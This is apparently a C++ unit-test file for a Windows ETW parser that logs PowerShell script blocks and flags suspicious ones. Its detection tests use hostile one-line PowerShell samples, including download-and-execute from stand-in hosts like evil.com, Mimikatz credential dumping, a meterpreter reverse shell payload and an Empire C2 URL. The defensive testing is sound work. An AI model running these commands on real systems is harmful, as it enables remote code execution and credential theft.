/// @file powershell_parser_test.cpp
/// @brief Unit tests for PowerShell ETW parser.

#include "powershell_parser_test_common.hpp"

#ifdef _WIN32

namespace exeray::etw {
namespace {

// =============================================================================
// 1. Script Block Parsing
// =============================================================================

TEST_F(PowerShellParserTest, ParseScriptBlock_ExtractsScriptContent) {
    std::wstring script = L"Get-Process | Select-Object Name";
    uint32_t message_number = 1;
    uint32_t message_total = 1;

    auto data = build_script_block_data(message_number, message_total, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.category, event::Category::Script);
    EXPECT_EQ(result.operation, static_cast<uint8_t>(event::ScriptOp::Execute));
    EXPECT_EQ(result.payload.script.sequence, message_number);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_ExtractsScriptBlockId) {
    std::wstring script = L"Write-Output 'Test'";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.category, event::Category::Script);
    EXPECT_NE(result.payload.script.script_block, event::INVALID_STRING);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_ExtractsPath) {
    std::wstring script = L"Write-Host 'Hello'";
    std::wstring path = L"C:\\Scripts\\test.ps1";

    auto data = build_script_block_data(1, 1, script, path);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.category, event::Category::Script);
}

// =============================================================================
// 2. Suspicious Pattern Detection (CRITICAL SECURITY)
// =============================================================================

TEST_F(PowerShellParserTest, ParseScriptBlock_IEX_Suspicious) {
    std::wstring script = L"iex (iwr http://malware.com/payload.ps1)";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
    EXPECT_EQ(result.status, event::Status::Suspicious);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_InvokeExpression_Suspicious) {
    std::wstring script = L"Invoke-Expression $encodedPayload";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_FromBase64_Suspicious) {
    std::wstring script = L"[System.Convert]::FromBase64String($payload)";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_EncodedCommand_Suspicious) {
    std::wstring script = L"powershell.exe -EncodedCommand ZQBjAGgAbwAgAEgAZQBsAGwAbwA=";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_WebClientDownload_Suspicious) {
    std::wstring script = L"$wc = New-Object Net.WebClient; $wc.DownloadString('http://evil.com')";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_Hidden_Suspicious) {
    std::wstring script = L"Start-Process powershell -WindowStyle Hidden -File script.ps1";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_BypassExecutionPolicy_Suspicious) {
    std::wstring script = L"powershell -ExecutionPolicy Bypass -File malware.ps1";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_DownloadString_Suspicious) {
    std::wstring script = L"(New-Object System.Net.WebClient).DownloadString('http://evil.com/payload')";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_InvokeMimikatz_Suspicious) {
    std::wstring script = L"Invoke-Mimikatz -DumpCreds";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_InvokeShellcode_Suspicious) {
    std::wstring script = L"Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_PowerSploit_Suspicious) {
    std::wstring script = L"Import-Module PowerSploit; Get-Keystrokes";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_Empire_Suspicious) {
    std::wstring script = L"$Empire = @{ 'ServerURL' = 'http://c2server.com'; }";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_BenignScript_NotSuspicious) {
    std::wstring script = L"Get-Process | Select-Object Name, Id | Format-Table";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 0u);
}

// =============================================================================
// 3. Case Insensitivity
// =============================================================================

TEST_F(PowerShellParserTest, SuspiciousPattern_CaseInsensitive) {
    // Test various case variations of IEX
    std::vector<std::wstring> variations = {
        L"IEX (something)",
        L"iex (something)",
        L"IeX (something)",
        L"ieX (something)"
    };

    for (const auto& script : variations) {
        auto data = build_script_block_data(1, 1, script);

        EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
        record.UserData = data.data();
        record.UserDataLength = static_cast<USHORT>(data.size());

        auto result = parse_powershell_event(&record, strings_.get());

        EXPECT_TRUE(result.valid) << "Failed for: " << std::string(script.begin(), script.end());
        EXPECT_EQ(result.payload.script.is_suspicious, 1u)
            << "Case insensitivity failed for: " << std::string(script.begin(), script.end());
    }
}

TEST_F(PowerShellParserTest, SuspiciousPattern_LowercaseConversion) {
    // Mixed case input should be converted to lowercase for matching
    std::wstring script = L"INVOKE-EXPRESSION $data; FROMBASE64STRING($encoded)";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 1u);
}

// =============================================================================
// 4. Module Logging
// =============================================================================

TEST_F(PowerShellParserTest, ParseModuleEvent_BasicParsing) {
    auto data = build_module_data(L"Get-Command");

    EVENT_RECORD record = make_record(ids::powershell::MODULE_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.category, event::Category::Script);
    EXPECT_EQ(result.operation, static_cast<uint8_t>(event::ScriptOp::Module));
}

TEST_F(PowerShellParserTest, ParseModuleEvent_MinimalPayload) {
    auto data = build_module_data();

    EVENT_RECORD record = make_record(ids::powershell::MODULE_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.is_suspicious, 0u);
    EXPECT_EQ(result.payload.script.script_block, event::INVALID_STRING);
}

// =============================================================================
// 5. Invalid Input
// =============================================================================

TEST_F(PowerShellParserTest, ParsePowerShellEvent_NullRecord_ReturnsInvalid) {
    auto result = parse_powershell_event(nullptr, strings_.get());

    EXPECT_FALSE(result.valid);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_TruncatedData_ReturnsInvalid) {
    std::vector<uint8_t> data(15, 0);  // Less than 16 bytes minimum

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_FALSE(result.valid);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_NullStringPool_NoIntern) {
    std::wstring script = L"Write-Host 'Test'";

    auto data = build_script_block_data(1, 1, script);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, nullptr);

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.script_block, event::INVALID_STRING);
}

// =============================================================================
// 6. Large Script Handling
// =============================================================================

TEST_F(PowerShellParserTest, ParseScriptBlock_LargeScript_FullParsing) {
    // 64KB script block
    const size_t script_size = 64 * 1024;
    auto data = build_large_script_data(script_size);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>((std::min)(data.size(), static_cast<size_t>(USHRT_MAX)));

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.category, event::Category::Script);
}

TEST_F(PowerShellParserTest, ParseScriptBlock_MultiPartScript_AllPartsLinked) {
    // Multi-part script: MessageNumber > 1 indicates continuation
    std::wstring script_part2 = L"# Continuation of script";
    uint32_t message_number = 2;  // Part 2 of 3
    uint32_t message_total = 3;

    auto data = build_script_block_data(message_number, message_total, script_part2);

    EVENT_RECORD record = make_record(ids::powershell::SCRIPT_BLOCK_LOGGING);
    record.UserData = data.data();
    record.UserDataLength = static_cast<USHORT>(data.size());

    auto result = parse_powershell_event(&record, strings_.get());

    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.payload.script.sequence, message_number);
}

}  // namespace
}  // namespace exeray::etw

#else  // !_WIN32

TEST(PowerShellParserTest, SkippedOnNonWindows) {
    GTEST_SKIP() << "ETW parser tests require Windows platform";
}

#endif  // _WIN32
